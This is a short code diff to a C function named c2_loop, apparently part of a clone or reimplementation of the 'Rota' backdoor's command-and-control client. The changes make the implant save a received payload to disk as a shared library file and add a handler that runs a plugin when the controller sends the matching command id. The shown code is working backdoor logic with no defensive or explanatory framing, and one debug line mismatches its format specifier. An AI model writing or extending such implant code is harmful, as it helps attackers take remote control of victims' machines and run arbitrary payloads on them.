@@ -208,7 +208,7 @@ void c2_loop() {
             #endif
 
             // TODO - break this out into a stub function
-            FILE *fd = fopen("local_rota_file", "w+");
+            FILE *fd = fopen("local_rota_file.so", "w+");
             int res = fwrite(payload, sizeof(payload[0]), payload_length, fd);
             fclose(fd);
 
@@ -275,14 +275,12 @@ void c2_loop() {
                 build_c2_response(msg, cmd_id, sock2);
             }
         }
-        else if (memcmp(&rota_c2_run_plugin_1, &cmd_id, 4) == 0) {
-            #ifdef DEBUG
-            printf("[+] Rota C2 Run Plugin 1\n");
-            #endif
+        else if (memcmp(&rota_c2_run_plugin_1, cmd_id, 4) == 0) {
+            c2_run_plugin_1(payload);
 
         } else {
             #ifdef DEBUG
-            printf("Unknown command id %s\n", cmd_id);
+            printf("Unknown command id %20x\n", cmd_id);
             #endif
         }
 
